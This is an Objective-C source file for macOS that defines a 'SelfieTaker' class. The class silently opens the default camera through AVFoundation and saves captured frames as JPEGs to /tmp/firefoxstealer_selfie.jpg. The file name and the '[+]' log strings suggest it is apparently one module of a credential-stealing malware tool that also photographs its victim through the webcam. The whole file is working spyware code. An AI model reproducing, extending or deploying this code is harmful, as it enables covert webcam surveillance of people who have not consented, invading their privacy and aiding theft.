#import "SelfieTaker.h"

@implementation SelfieTaker

@synthesize session;
@synthesize queue;


- (void)captureOutput:(AVCaptureOutput*)output didOutputSampleBuffer:(CMSampleBufferRef)buffer fromConnection:(AVCaptureConnection*)connection {
    
    CVImageBufferRef frame = CMSampleBufferGetImageBuffer(buffer);
    CIImage *ciImage = [CIImage imageWithCVImageBuffer:frame];
    NSBitmapImageRep* bitmapRep = [[NSBitmapImageRep alloc] initWithCIImage: ciImage];
    NSData* jpgData = [bitmapRep representationUsingType:NSBitmapImageFileTypeJPEG properties:@{}];
    [jpgData writeToFile:@"/tmp/firefoxstealer_selfie.jpg" atomically:YES];
}

- (instancetype)init {
    self = [super init];
    if (self) {
        self.session = [AVCaptureSession new];
        self.queue = dispatch_get_main_queue();
        
        NSError *error = nil;
        AVCaptureDevice *device = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
        
        AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];
        if (error != nil) {
            NSLog(@"[+] Error in SelfieTaker: %@", [error localizedDescription]);
        }
        
        AVCaptureVideoDataOutput* output = [AVCaptureVideoDataOutput new];
        [output setSampleBufferDelegate:self queue:self.queue];
        [output setAlwaysDiscardsLateVideoFrames:YES];
               
        if ([self.session canAddInput:input]) {
            [self.session addInput:input];
        } else {
            NSLog(@"[+] Couldn't add input");
        }

        if ([self.session canAddOutput:output]) {
            [self.session addOutput:output];
        } else {
            NSLog(@"[+] Couldn't add output");
        }
        
        dispatch_async(self.queue, ^{
             [self.session startRunning];
         });
    }
    return self;
}

- (void)stopTakingSelfie {
    [self.session stopRunning];
}

@end
